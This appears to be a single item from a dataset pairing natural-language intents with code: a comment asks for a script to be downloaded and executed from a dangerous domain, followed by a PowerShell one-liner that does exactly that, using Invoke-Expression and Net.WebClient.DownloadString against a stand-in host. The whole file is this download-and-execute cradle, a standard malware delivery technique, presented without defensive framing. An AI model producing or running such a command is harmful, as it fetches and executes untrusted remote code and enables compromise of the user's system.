# Natural language intent:
# Invoke Expression to download and execute a script from a dangerous domain.

Invoke-Expression -Command 'IEX (New-Object Net.WebClient).DownloadString("http://dangerousdomain.com/KernDLL.ps1")'
